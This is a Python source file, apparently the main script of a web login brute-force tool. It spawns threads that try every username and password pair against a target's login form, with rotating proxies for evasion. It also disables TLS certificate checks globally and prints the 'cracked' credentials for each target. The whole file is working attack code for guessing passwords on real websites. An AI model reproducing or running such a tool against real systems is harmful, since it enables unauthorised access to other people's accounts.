#!/usr/bin/python
# -*- coding: utf-8 -*-

def attack(options, loginInfo):
	def run_threads(threads, sending, completed, total):
		# Run threads
		for thread in threads:
			thread.start()

		# Wait for threads completed
		for thread in threads:
			completed += 1
			progressbar.progress_bar(sending, completed, total)
			thread.join()

		return sending, completed

	### SETTING UP FOR NEW ATTACK ###
	if options.attack_mode == "--httpget":
		from modules import httpget
		attack_module = httpget.submit

	elif options.attack_mode == "--loginbrute":
		from modules import loginbrute
		attack_module = loginbrute.submit
	else:
		events.error("Invalid attack mode", "ARGS")
		sys.exit(1)

	if not loginInfo:
		# Test for 2 steps... login?
		events.error("No login request found")
		sys.exit(1)
	else:
		if options.verbose:
			events.success("Login request has been found", "CHECK")

	tasks = len(options.passwd) * len(options.username)
	events.info("[Tasks: %s] [ID: %s] [Controls: %s]" % (tasks, loginInfo[0], loginInfo[1][::-1]))

	import threading

	if sys.version_info[0] == 2:
		import Queue
		result = Queue.Queue()
	else:
		import queue
		result = queue.Queue()

	sending, completed = 0, 0
	try:
		#### START ATTACK ####
		workers = []

		for username in options.username:
			if "--upwd" in options.extras \
					and username not in options.passwd \
					and options.options["-p"] is not "sqli":
				options.passwd += (username,)
			for password in options.passwd:
				if len(workers) == options.threads:
					sending, completed = run_threads(workers, sending, completed, tasks)
					del workers[:]

				if username in [x[1] for x in list(result.queue)]:
					break
				worker = threading.Thread(
					target=attack_module,
					args=(options, loginInfo, [password, username], result)
				)
				worker.daemon = True
				workers.append(worker)

		sending, completed = run_threads(workers, sending, completed, tasks)
		del workers[:]

	except KeyboardInterrupt:
		events.error("Terminated by user", "STOPPED")
		global set_break
		set_break = True

	except SystemExit:
		events.error("Terminated by user", "STOPPED")

	except Exception as error:
		events.error("%s" % (error))

	finally:
		try:  # clear resource
			del options.username[:]
			del options.passwd[:]
		except:
			pass
		credentials = list(result.queue)
		if len(credentials) == 0:
			events.error("No match found", "RESULT")

		else:
			events.success("%s valid password[s] found" % (len(credentials)), "RESULT")
			if not credentials[0][1]:
				utils.print_table(("URL", "Password"), *[creds[::2] for creds in credentials])
			else:
				utils.print_table(("Username", "Password"), *[creds[-2:] for creds in credentials])
			print("")
		return credentials


if __name__ == "__main__":
	# if check_import():
	# IMPORT GLOBALY
	import sys, time, ssl
	from cores import options, check
	import utils
	from utils import progressbar, banners, events
	from extras import getproxy

	try:
		# Setting new session
		runtime = time.time()
		# reload(sys)
		# sys.setdefaultencoding('utf8')

		# Get options
		options = options.ParseOptions()

		check.check_options(options)

		if "--getproxy" in options.extras:
			getproxy.getnew(options)
			if not options.target:
				events.info("No URL. Get latest proxy list only", "PROXY")
				sys.exit(0)
			else:
				if not options.run_options["--proxy"]:
					events.warn("Program runs without any proxy")
		if not options.target:
			events.error("URL is required")
			sys.exit(1)

		else:
			# Fix SSL errors https://stackoverflow.com/a/35960702
			try:
				_create_unverified_https_context = ssl._create_unverified_context
			except AttributeError:
				# Legacy Python that doesn't verify HTTPS certificates by default
				pass
			else:
				# Handle target environment that doesn't support HTTPS verification
				ssl._create_default_https_context = _create_unverified_https_context

			banners.start_banner(options)
			results = []
			set_break = False
			for idu, url in enumerate(options.target):
				if set_break:
					break
				if url:
					# Clean other URL options (Fix URL_panel and URL login bug)
					options.login_url = None
					options.panel_url = None
					options.url = check.check_url(url)
					if "--getproxy" in options.extras and len(options.target) == 1 and options.run_options["--proxy"]:
						events.warn("Check proxy connection")
						getproxy.check(options)
					if options.run_options["--proxy"]:
						if len(options.target) > 1:
							events.info("Check proxy connection for %s" % (options.url))
							getproxy.check(options)
						try:
							options.proxy = getproxy.livelist()
						except:
							events.error("Error while reading list")
							getproxy.check(options)
							options.proxy = getproxy.livelist()

					events.info("[%s / %s] [%s]" % (idu + 1, len(options.target), options.url))
					loginInfo = check.find_login_request(options)
					if loginInfo:
						check.check_tasks(options, loginInfo)
						result = attack(options, loginInfo)
						if result:
							for _result in result:
								results.append(_result)
					# results.append(result)
					else:
						events.error("No login request found")

			if "--reauth" in options.extras:
				from extras import reauth

				reauth.run(options, result)

	except Exception as error:
		events.error("%s" % (error), "STOPPED")
		sys.exit(1)

	finally:
		runtime = time.time() - runtime
		try:
			if len(options.target) > 0:
				if len(results) > 0 and len(options.target) > 1:
					events.success("Cracked %s target[s]" % (len(results)), "RESULT")
					utils.print_table(("URL", "Username", "Password"), *results)
			else:
				events.error("No target has been cracked", "RESULT")
		except:
			pass
		events.success("Elapsed: %0.2f [-] %s" % (runtime, time.strftime("%Y-%m-%d %H:%M")))
